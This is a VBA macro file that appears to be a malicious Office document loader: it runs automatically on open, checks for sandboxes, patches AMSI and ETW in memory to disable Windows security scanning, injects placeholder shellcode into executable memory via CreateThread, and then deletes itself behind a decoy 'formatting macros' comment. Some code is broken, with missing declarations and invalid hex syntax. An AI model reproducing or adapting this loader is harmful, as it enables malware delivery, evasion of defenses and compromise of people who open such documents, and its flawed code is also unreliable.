#If VBA7 Then
  Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize AsLong, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
  Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As LongPtr) As LongPtr
  Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As LongPtr) As Long
  Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
  Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
  Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibName As String) As LongPtr
#Else
  '... (32-bit declarations omitted for brevity)
#End If

Sub AutoOpen()
    If Not ValidateEnvironment() Then Exit Sub
    BypassAMSIETW
    ExecuteStagedPayload
    SelfDestruct
End Sub

Private Function ValidateEnvironment() As Boolean
    On Error Resume Next
    ' --- Sandbox/Virtualization Checks ---
    If Environ("USERDOMAIN") <> "LAB-DOMAIN" Then Exit Function
    If GetTickCount() < 600000 Then Exit Function ' Uptime >10min
    If Not CheckCursorMovement() Then Exit Function
    
    ' --- Lab-Specific Process Check ---
    Dim wmi As Object, processes As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='vmtoolsd.exe'")
    If processes.Count = 0 Then Exit Function
    
    ValidateEnvironment = True
End Function

Private Sub BypassAMSIETW()
    Dim amsiDll As LongPtr: amsiDll = LoadLibrary("ams" & "i.dll")
    Dim etwDll As LongPtr: etwDll = LoadLibrary("ntd" & "ll.dll")
    
    ' --- Patch AMSI ---
    Dim amsiScanAddr As LongPtr: amsiScanAddr = GetProcAddress(amsiDll, "AmsiScan" & "Buffer")
    PatchMemory amsiScanAddr, ChrW$(0xC359) ' POP ECX; RET
    
    ' --- Patch ETW ---
    Dim etwWriteAddr As LongPtr: etwWriteAddr = GetProcAddress(etwDll, "EtwEvent" & "Write")
    PatchMemory etwWriteAddr, ChrW$(0xC3) ' RET
End Sub

Private Sub PatchMemory(addr As LongPtr, newBytes As String)
    Dim oldProtect As LongPtr
    VirtualProtect addr, Len(newBytes), &H40, VarPtr(oldProtect)
    CopyMemory addr, StrPtr(newBytes), Len(newBytes)
    VirtualProtect addr, Len(newBytes), oldProtect, VarPtr(oldProtect)
End Sub

Private Sub ExecuteStagedPayload()
    Dim payload As String: payload = DeobfuscateHex("fc4883e4...") ' Replace with your shellcode
    Dim mem As LongPtr: mem = VirtualAlloc(0, Len(payload), &H1000, &H40)
    CopyMemory mem, StrPtr(payload), Len(payload)
    CreateThread 0, 0, mem, 0, 0, 0
End Sub

Private Function CheckCursorMovement() As Boolean
    Dim origX As Long, origY As Long
    GetCursorPos origX, origY
    Sleep 5000
    Dim newX As Long, newY As Long
    GetCursorPos newX, newY
    CheckCursorMovement = (origX <> newX) Or (origY <> newY)
End Function

Private Function DeobfuscateHex(hexStr As String) As String
    Dim i As Long, out As String
    For i = 1 To Len(hexStr) Step 2
        out = out & Chr$(Val("&H" & Mid$(hexStr, i, 2)))
    Next
    DeobfuscateHex = out
End Function

Private Sub SelfDestruct()
    Dim codeMod As Object
    Set codeMod = ThisDocument.VBProject.VBComponents(1).CodeModule
    codeMod.DeleteLines 1, codeMod.CountOfLines
    codeMod.AddFromString "' Document formatting macros"
End Sub
